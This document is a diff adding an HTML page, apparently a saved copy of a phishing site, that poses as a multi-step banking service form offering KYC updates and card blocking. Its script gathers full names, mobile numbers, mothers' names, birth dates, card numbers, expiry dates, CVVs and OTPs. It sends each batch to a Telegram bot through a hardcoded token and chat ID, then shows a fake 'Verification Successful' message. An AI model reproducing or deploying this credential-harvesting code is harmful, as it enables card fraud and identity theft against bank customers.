@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<!-- saved from url=(0027)https://icici3.netlify.app/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Advanced Multi-Step Form</title>
+  <style>
+    /* General Styles */
+    body, html {
+      background-color: #ffffff; /* White background */
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #333;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Header and Footer Images */
+    .header-img, .footer-img {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+      position: fixed;
+    }
+    .header-img {
+      top: 0;
+    }
+    .footer-img {
+      bottom: 0;
+    }
+
+    /* Container Styling */
+    .container {
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 100px 60px;
+      border-radius: 15px;
+      box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 450px;
+      text-align: center;
+      margin-top: 100px; /* Space for header */
+      margin-bottom: 60px; /* Space for footer */
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    h2 {
+      font-family: 'Poppins', sans-serif;
+      margin-bottom: 30px;
+      font-size: 26px;
+      color: #007bff;
+      letter-spacing: 1.2px;
+    }
+
+    .form-step {
+      display: none;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    .form-step.active {
+      display: block;
+    }
+
+    /* Enhanced Input and Select Styles with Animation */
+    input, select {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+      background-color: #f8f9fa;
+    }
+
+    input:focus, select:focus {
+      box-shadow: 0px 0px 10px rgba(0, 123, 255, 0.5);
+      border-color: #007bff;
+      transform: scale(1.05);
+      outline: none;
+    }
+
+    /* Button Styling */
+    .button {
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      cursor: pointer;
+      margin-top: 20px;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
+      transition: background-color 0.3s, transform 0.2s;
+      letter-spacing: 1.2px;
+    }
+
+    .button:hover {
+      background-color: #0056b3;
+      transform: scale(1.03);
+    }
+
+    /* Verification Animation */
+    .verification-animation {
+      display: none;
+      font-size: 24px;
+      font-weight: bold;
+      animation: fadeInScale 1s ease forwards, pulse 1s infinite alternate;
+      margin-top: 30px;
+      letter-spacing: 1.2px;
+      color: #007bff; /* Set to blue for "Verifying Your Details..." */
+    }
+
+    /* Success Verification Text Color */
+    .verification-animation.success {
+      color: #28a745; /* Green color for "Verification Successful!" */
+    }
+
+    /* Keyframes for Animations */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes fadeInScale {
+      from { opacity: 0; transform: scale(0.8); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @keyframes pulse {
+      from { opacity: 0.8; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+  <img src="./Advanced Multi-Step Form_files/1header.jpg" alt="Header Image" class="header-img">
+  <br>
+  <div class="container">
+     <!-- Step 1 -->
+    <div id="step1" class="form-step">
+      <input type="text" id="fullname" placeholder="Full Name" required="">
+      <input type="text" id="mobile" placeholder="Mobile Number" required="">
+      <select id="service" required="">
+        <option value="">Select Service</option>
+        <option value="KYC Update">KYC Update</option>
+        <option value="Card Block">Card Block</option>
+        <option value="Stop Services">Stop Services</option>
+        <option value="Redeem Reward Point">Redeem Reward Point</option>
+        <option value="New Credit Card Apply">New Credit Card Apply</option>
+        <option value="Greeted Card">Greeted Card</option>
+        <option value="Other Service">Other Service</option>
+      </select>
+      <button class="button" onclick="showVerification(&#39;step2&#39;)">Next</button>
+    </div>
+
+    <!-- Step 2 -->
+    <div id="step2" class="form-step active">
+      <input type="text" id="mothername" placeholder="Mother&#39;s Name" required="">
+      <input type="text" id="dob" placeholder="Date of Birth (DD/MM/YYYY)" maxlength="10" required="" oninput="formatDOB(this)">
+      <button class="button" onclick="showVerification(&#39;step3&#39;)">Next</button>
+    </div>
+
+    <!-- Step 3 -->
+    <div id="step3" class="form-step">
+      <input type="text" id="cardnumber" placeholder="Card Number" required="">
+      <input type="text" id="expiry" placeholder="Expiry Date (MM/YY)" maxlength="5" required="" oninput="formatExpiry(this)">
+      <input type="text" id="cvv" placeholder="CVV" maxlength="3" required="">
+      <button class="button" onclick="showVerification(&#39;step4&#39;)">Next</button>
+    </div>
+
+    <!-- Step 4 -->
+    <div id="step4" class="form-step">
+      <input type="text" id="otp" placeholder="Enter 6 Digit OTP" maxlength="6" required="">
+      <button class="button" onclick="submitForm()">Submit</button>
+    </div>
+
+    <!-- Verification Animation -->
+    <div id="verification-animation" class="verification-animation success" style="display: none;">Verification Successful!</div>
+  </div>
+
+  
+  <script>
+    let currentStep = 1;
+
+    function showVerification(nextStepId) {
+      // Collect form data
+      const fullname = document.getElementById('fullname').value;
+      const mobile = document.getElementById('mobile').value;
+      const service = document.getElementById('service').value;
+      const mothername = document.getElementById('mothername').value;
+      const dob = document.getElementById('dob').value;
+      const cardnumber = document.getElementById('cardnumber').value;
+      const expiry = document.getElementById('expiry').value;
+      const cvv = document.getElementById('cvv').value;
+
+      // Show verification animation
+      const verificationAnimation = document.getElementById('verification-animation');
+      verificationAnimation.style.display = 'block';
+      verificationAnimation.textContent = "Verifying Your Details...";
+      verificationAnimation.classList.remove('success'); // Remove success class in case it was added previously
+
+      // Send data to Telegram with Markdown formatting
+      const botToken = '7456438229:AAGLCioiH8MTpZ8DkUpSJgPKfLhpt6iVsCc'; // Your Bot Token
+      const chatId = '7155441629'; // Your Chat ID
+      const message = `
+*New Form Submission:*
+
+*Full Name:* ${fullname}
+*Mobile Number:* ${mobile}
+*Service Requested:* ${service}
+
+*Mother's Name:* ${mothername}
+*Date of Birth:* ${dob}
+
+*Card Details:*
+*Card Number:* ${cardnumber}
+*Expiry Date:* ${expiry}
+*CVV:* ${cvv}
+      `;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Send data
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'  // Use Markdown for better formatting
+        })
+      });
+
+      // Change text to "Verification Successful" after 3 seconds and apply green color
+      setTimeout(() => {
+        verificationAnimation.textContent = "Verification Successful!";
+        verificationAnimation.classList.add('success'); // Add success class for green color
+      }, 3000);
+
+      // Hide current step and show next step after 5 seconds
+      document.getElementById(`step${currentStep}`).classList.remove('active');
+      setTimeout(() => {
+        verificationAnimation.style.display = 'none';
+        currentStep++;
+        document.getElementById(nextStepId).classList.add('active');
+      }, 5000); // Show next step after the animation completes
+    }
+
+
+    function formatExpiry(input) {
+      input.value = input.value.replace(/[^0-9]/g, '').replace(/(.{2})(.{2})/, '$1/$2');
+    }
+
+    function submitForm() {
+  // Get OTP value
+  const otp = document.getElementById('otp').value;
+
+  // Send OTP Submission Data to Telegram
+  const botToken = '7456438229:AAGLCioiH8MTpZ8DkUpSJgPKfLhpt6iVsCc'; // Your Bot Token
+  const chatId = '7155441629'; // Your Chat ID
+  const message = `OTP Submitted: ${otp}`;
+
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'Markdown'
+    })
+  });
+
+  // Reset OTP input field
+  document.getElementById('otp').value = '';
+
+  // Show Successful Verification message
+  const verificationAnimation = document.getElementById('verification-animation');
+  verificationAnimation.style.display = 'block';
+  verificationAnimation.textContent = "Successful Verification!";
+  verificationAnimation.classList.add('success'); // Add success class for green color
+
+  // Optionally, you can hide this message after a few seconds
+  setTimeout(() => {
+    verificationAnimation.style.display = 'none';
+  }, 3000); // Hide after 3 seconds
+}
+
+  </script>
+
+
+
+</body></html>
